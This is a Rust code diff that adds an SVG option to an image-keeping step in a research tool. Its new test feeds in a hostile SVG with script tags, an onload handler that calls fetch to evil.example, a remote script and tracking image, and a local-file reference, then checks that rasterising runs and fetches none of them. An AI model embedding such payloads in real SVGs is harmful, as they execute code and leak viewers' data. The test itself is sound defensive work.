@@ -463,6 +463,8 @@ pub struct Pictures {
     pub per_source: usize,
     /// How many more pictures this run may fetch.
     pub left: AtomicUsize,
+    /// `[research] svg` (`specs/118` §11): SVG pictures are drawn and kept only when this is on.
+    pub svg: bool,
 }
 
 impl KeepStep {
@@ -537,7 +539,7 @@ impl KeepStep {
         let left = p.left.load(Ordering::SeqCst);
         let url = snap.final_url.for_daemon();
         let body = String::from_utf8_lossy(snap.body_for_daemon()).into_owned();
-        let rules = crate::research_images::PictureRules { transport: p.transport.as_ref(), list: &r.list, per_source: p.per_source, left };
+        let rules = crate::research_images::PictureRules { transport: p.transport.as_ref(), list: &r.list, per_source: p.per_source, left, svg: p.svg };
         let out = blocking(|| crate::research_images::keep_for_source(lib, id, url, &body, &rules, None));
         // One run captures one page at a time, so nothing else moves the count between the load above and this store.
         p.left.store(left.saturating_sub(out.fetched), Ordering::SeqCst);
@@ -1408,7 +1410,7 @@ mod tests {
         let commons = "{\"query\":{\"pages\":{\"1\":{\"imageinfo\":[{\"extmetadata\":{\"LicenseShortName\":{\"value\":\"CC BY-SA 4.0\"},\"Artist\":{\"value\":\"Ann\"}}}]}}}}";
         let web = || Arc::new(PictureWeb(std::collections::HashMap::from([(img.to_string(), Response { status: 200, body: pic.clone(), ..Default::default() }), (api.clone(), Response { status: 200, body: commons.as_bytes().to_vec(), ..Default::default() })]), Default::default()));
         let figure = "Intro text. <a href=\"/wiki/File:Tree.png\"><img alt=\"A fault tree\" src=\"//upload.wikimedia.org/wikipedia/commons/a/ab/Tree.png\" width=\"200\" height=\"120\"></a> More text.";
-        let pictures = |w: &Arc<PictureWeb>, per_source: usize, per_run: usize| Some(Pictures { transport: w.clone(), per_source, left: AtomicUsize::new(per_run) });
+        let pictures = |w: &Arc<PictureWeb>, per_source: usize, per_run: usize| Some(Pictures { transport: w.clone(), per_source, left: AtomicUsize::new(per_run), svg: false });
         let home = tempfile::tempdir().unwrap();
         let l = crate::library::Library::in_home(home.path());
         let w = web();
@@ -1452,6 +1454,88 @@ mod tests {
         assert!(l.attach_pictures(&id4, home.path(), &[json!({"file": "x.png"})], &crate::library::Budgets::default()).is_err(), "the library refuses pictures for a source it holds no text of");
     }
 
+    /// `specs/118` §4 and AC-4. An SVG that holds a script and references to outside pictures (a web address, a file on this machine,
+    /// a `data:` picture) is drawn to a PNG with none of them run, read or fetched: the transport sees the SVG's own address and the
+    /// Commons record, nothing else. The PNG is the served picture with the licence record; the SVG is kept beside it, named in the
+    /// record, never served, and not listed by `assets check`. A WebP is kept as it is, with its record, and served through the image
+    /// method's `max`. An SVG with no licence of its own is refused by the same licence decision as any picture, before it is fetched.
+    #[tokio::test]
+    async fn an_svg_is_drawn_with_nothing_run_or_fetched_a_webp_is_kept_as_it_is_and_the_licence_decision_is_unchanged() {
+        use delphi_adapter::config::WeakSources;
+        use delphi_adapter::research::transport::Response;
+        let dir = tempfile::tempdir().unwrap();
+        let local = dir.path().join("secret.png");
+        std::fs::write(&local, delphi_docs::png::encode(&delphi_docs::png::Image { width: 4, height: 4, rgba: [0u8, 255, 0, 255].repeat(16) }, &[])).unwrap();
+        let svg = format!(
+            "<?xml version=\"1.0\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" height=\"150\">\
+             <script>fetch('https://evil.example/ran')</script><script xlink:href=\"https://evil.example/x.js\"/>\
+             <rect width=\"300\" height=\"150\" fill=\"#ffffff\" onload=\"fetch('https://evil.example/onload')\"/>\
+             <image width=\"150\" height=\"150\" xlink:href=\"https://evil.example/track.png\"/>\
+             <image x=\"150\" width=\"150\" height=\"150\" href=\"{}\"/>\
+             <path d=\"M10 140 L290 10\" stroke=\"#0000ff\" stroke-width=\"6\"/></svg>",
+            local.display()
+        );
+        let webp = {
+            let rgba: Vec<u8> = (0..80 * 60).flat_map(|i| [(i % 80 * 3) as u8, (i / 80 * 4) as u8, 60, 255]).collect();
+            let mut out = Vec::new();
+            image_webp::WebPEncoder::new(&mut out).encode(&rgba, 80, 60, image_webp::ColorType::Rgba8).unwrap();
+            out
+        };
+        let svg_url = "https://upload.wikimedia.org/wikipedia/commons/d/d1/Flow.svg";
+        let webp_url = "https://en.wikipedia.org/static/map.webp";
+        let bare_svg = "https://en.wikipedia.org/static/diagram.svg";
+        let api = delphi_adapter::research::images::commons_api_url("File:Flow.svg").unwrap();
+        let commons = "{\"query\":{\"pages\":{\"1\":{\"imageinfo\":[{\"extmetadata\":{\"LicenseShortName\":{\"value\":\"CC BY-SA 4.0\"},\"Artist\":{\"value\":\"Ann\"}}}]}}}}";
+        let ok = |b: Vec<u8>| Response { status: 200, body: b, ..Default::default() };
+        let w = Arc::new(PictureWeb(
+            std::collections::HashMap::from([(svg_url.to_string(), ok(svg.clone().into_bytes())), (webp_url.to_string(), ok(webp.clone())), (bare_svg.to_string(), ok(svg.clone().into_bytes())), (api.clone(), ok(commons.as_bytes().to_vec()))]),
+            Default::default(),
+        ));
+        let page = [
+            "A flow. <a href=\"/wiki/File:Flow.svg\"><img alt=\"A flow chart\" src=\"//upload.wikimedia.org/wikipedia/commons/d/d1/Flow.svg\" width=\"300\" height=\"150\"></a> More text.",
+            "<figure><img alt=\"A map of faults\" src=\"/static/map.webp\" width=\"80\" height=\"60\"><figcaption>Map</figcaption><a rel=\"license\" href=\"https://creativecommons.org/licenses/by/4.0/\">CC BY</a></figure>",
+            "A diagram with no licence of its own. <img alt=\"A diagram\" src=\"/static/diagram.svg\" width=\"300\" height=\"150\"> The end.",
+        ];
+        let home = tempfile::tempdir().unwrap();
+        let l = crate::library::Library::in_home(home.path());
+        let keep = KeepStep::new(keep_rules(WeakSources::Label), Some(Pictures { transport: w.clone(), per_source: 6, left: AtomicUsize::new(24), svg: true }));
+        let (lib, url, text) = kept_library(home.path(), keep, "https://en.wikipedia.org/wiki/Fault_tree", &[KEEP_PROSE, page[0], page[1], page[2]]);
+        let id = lib.capture(&url, &text, true).await.unwrap();
+
+        // AC-4: nothing the SVG names was asked for, and the file on this machine was not drawn.
+        let asked = w.1.lock().unwrap().clone();
+        assert!(asked.iter().all(|u| u == svg_url || u == webp_url || u == &api), "only the pictures and the Commons record were asked: {asked:?}");
+        assert!(!asked.iter().any(|u| u == bare_svg), "the unlicensed SVG was refused before it was fetched: {asked:?}");
+        let images = l.read_meta(&id).unwrap()["images"].as_array().cloned().unwrap();
+        assert_eq!(images.len(), 2, "{images:?}");
+        let drawn = images.iter().find(|r| r["source_url"] == svg_url).expect("the SVG's drawing has a record");
+        let png_name = drawn["file"].as_str().unwrap();
+        assert!(png_name.ends_with(".png"), "{drawn}");
+        assert_eq!((drawn["licence"].as_str(), drawn["width"].as_u64(), drawn["height"].as_u64()), (Some("CC-BY-SA-4.0"), Some(300), Some(150)), "{drawn}");
+        let assets = l.source_dir(&id).join("assets");
+        let png = std::fs::read(assets.join(png_name)).unwrap();
+        assert_eq!(png_name, format!("{}.png", blake3::hash(&png).to_hex()));
+        let px = delphi_docs::pixels::decode(&png).unwrap();
+        assert_eq!(px.pixel(40, 40), [255, 255, 255, 255], "the outside picture was not drawn");
+        assert_eq!(px.pixel(225, 75), [255, 255, 255, 255], "the local file was not drawn");
+        assert_eq!((px.pixel(150, 75)[2], px.pixel(150, 75)[0]), (255, 0), "the SVG's own shapes were");
+        let original = drawn["rendered_from"]["file"].as_str().unwrap();
+        assert_eq!((drawn["rendered_from"]["format"].as_str(), original), (Some("svg"), format!("{}.svg", blake3::hash(svg.as_bytes()).to_hex()).as_str()), "named by its own hash");
+        assert_eq!(std::fs::read(assets.join(original)).unwrap(), svg.as_bytes(), "the SVG is kept beside its PNG, as fetched");
+        assert_eq!(drawn["rendered_from"]["blake3"].as_str().map(String::from), Some(blake3::hash(svg.as_bytes()).to_hex().to_string()));
+        assert!(l.asset_record(&id, original).is_none(), "the SVG has no record of its own, so nothing serves it");
+        assert!(l.assets_check(false).is_empty(), "nor is it an unrecorded picture: {:?}", l.assets_check(false));
+        assert_eq!(l.image_assets(&id).len(), 2, "a page that gathers the source finds the PNG and the WebP, not the SVG");
+
+        // §4 item 1: the WebP is kept as it is, with its record.
+        let wrec = images.iter().find(|r| r["source_url"] == webp_url).expect("the WebP has a record");
+        let wname = wrec["file"].as_str().unwrap();
+        assert_eq!(wname, format!("{}.webp", blake3::hash(&webp).to_hex()));
+        assert_eq!(std::fs::read(assets.join(wname)).unwrap(), webp, "stored as it is");
+        assert_eq!((wrec["licence"].as_str(), wrec["licence_evidence"]["check"].as_str(), wrec["width"].as_u64(), wrec["height"].as_u64()), (Some("CC-BY-4.0"), Some("figure_link"), Some(80), Some(60)), "{wrec}");
+        assert_eq!(l.credit_line(&id, wname).as_deref(), Some("*Picture credit: author not stated, CC-BY-4.0, https://en.wikipedia.org/wiki/Fault_tree*"), "an address keeps its underscores");
+    }
+
     /// `specs/118` AC-3 and §3 item 4: a run on a page with one openly licensed picture and one with no licence of its own keeps the
     /// first with its record, refuses the second without fetching it, and writes both into the run's record, the refusal under its
     /// fixed word. A host's `record_research` names pictures: only the named ones are judged, and a name the page does not show is
@@ -1473,7 +1557,7 @@ mod tests {
         let other = "A second figure. <img alt=\"A chart of faults\" src=\"/static/chart.png\" width=\"200\" height=\"120\"> The end.";
         let home = tempfile::tempdir().unwrap();
         let topic = crate::research_record::Topic::begin(&home.path().join("ws"), &crate::research_record::Begin { question: "what is a fault tree", asked_by: crate::research_record::Asker::operator(), project: None, depth: delphi_core::research::Depth::Survey, run_id: "r-1" }).unwrap();
-        let keep = KeepStep::new(keep_rules(WeakSources::Label), Some(Pictures { transport: w.clone(), per_source: 6, left: AtomicUsize::new(24) })).recording(topic.clone(), "r-1");
+        let keep = KeepStep::new(keep_rules(WeakSources::Label), Some(Pictures { transport: w.clone(), per_source: 6, left: AtomicUsize::new(24), svg: false })).recording(topic.clone(), "r-1");
         let (lib, url, text) = kept_library(home.path(), keep, "https://en.wikipedia.org/wiki/Fault_tree", &[KEEP_PROSE, figure, other]);
         let id = lib.capture(&url, &text, true).await.unwrap();
         let l = crate::library::Library::in_home(home.path());
@@ -1489,7 +1573,7 @@ mod tests {
 
         // The named form, as `record_research` uses it: only the named picture is judged; a name the page does not show is refused.
         let snap = lib.held.as_ref().unwrap().read_as(&url, &text).unwrap();
-        let rules = crate::research_images::PictureRules { transport: w.as_ref(), list: &keep_rules(WeakSources::Label).list, per_source: 6, left: 24 };
+        let rules = crate::research_images::PictureRules { transport: w.as_ref(), list: &keep_rules(WeakSources::Label).list, per_source: 6, left: 24, svg: false };
         let named = [bare.to_string(), "https://en.wikipedia.org/static/elsewhere.png".to_string()];
         let got = blocking(|| crate::research_images::keep_for_source(&l, &id, &url, &String::from_utf8_lossy(snap.body_for_daemon()), &rules, Some(&named)));
         assert!(got.kept.is_empty(), "{got:?}");
